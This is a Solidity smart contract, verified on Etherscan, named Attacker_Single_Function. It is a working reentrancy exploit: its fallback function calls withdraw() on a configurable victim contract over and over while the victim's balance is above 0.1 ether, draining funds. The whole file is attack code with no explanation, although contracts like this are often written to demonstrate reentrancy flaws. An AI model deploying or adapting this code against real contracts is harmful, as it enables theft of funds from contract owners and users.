/**
 *Submitted for verification at Etherscan.io on 2021-05-06
*/

pragma solidity ^0.4.25;

interface attackInterface {
    function withdraw() external returns(bool);
}


contract Attacker_Single_Function {
    address public victimContractAddress;
    
    constructor () public payable {
        
    }
    
    function() external payable {
        if(victimContractAddress.balance > 0.1 ether){
            attackInterface(victimContractAddress).withdraw();
        }
    }
    
    function Attackingwithdraw() public returns (bool) {
        attackInterface(victimContractAddress).withdraw();
        return true;
    }
    
    function updateVictimaddress(address _victim) public returns(bool) {
        victimContractAddress = _victim;
        return true;
    } 
}